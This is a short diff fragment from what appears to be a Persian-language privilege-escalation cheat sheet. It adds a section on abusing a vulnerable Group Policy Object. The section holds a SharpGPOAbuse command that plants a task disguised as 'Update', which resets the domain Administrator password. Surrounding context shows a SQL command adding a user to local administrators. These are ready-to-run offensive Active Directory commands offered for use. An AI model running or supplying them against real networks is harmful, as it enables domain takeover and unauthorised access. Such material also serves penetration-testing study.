@@ -558,6 +558,12 @@ Invoke-SQLOCmd -Verbose -Command “net localgroup administrators user1 /add” 
 2.klist
 ```
 
+### ارتقا دسترسی با GPO آسیب پذیر
+
+```text
+1..\SharpGPOAbuse.exe --AddComputerTask --Taskname "Update" --Author DOMAIN\<USER> --Command "cmd.exe" --Arguments "/c net user Administrator Password!@# /domain" --GPOName "ADDITIONAL DC CONFIGURATION"
+```
+
 ### ارتقا دسترسی با gdbus
 
 ```text
